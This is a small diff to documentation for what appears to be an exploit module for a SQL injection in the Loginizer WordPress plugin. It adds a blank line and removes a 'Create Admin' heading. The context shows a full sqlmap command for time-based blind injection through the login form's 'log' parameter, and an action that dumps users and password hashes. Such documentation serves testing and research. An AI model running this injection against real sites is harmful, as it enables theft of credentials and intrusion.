@@ -10,6 +10,7 @@ All versions can be downloaded from [wordress.org](https://wordpress.org/plugins
 or [1.6.3](https://downloads.wordpress.org/plugin/loginizer.1.6.3.zip)
 
 This module slightly replicates sqlmap running as:
+
 ```
 python3 sqlmap.py -u http://local.target/wp-login.php --method='POST' --data='log=&pwd=password&wp-submit=Log+In&redirect_to=&testcookie=1' -p log --prefix="', ip = LEFT(UUID(), 8), url = ( TRUE " --suffix=") -- wpdeeply" --dbms mysql --technique=T --time-sec=1 --current-db
 ```
@@ -28,8 +29,6 @@ python3 sqlmap.py -u http://local.target/wp-login.php --method='POST' --data='lo
 ### ACTION: List Users
 
 This action lists `COUNT` users and password hashes.
-
-### ACTION: Create Admin
 
 ### COUNT
 
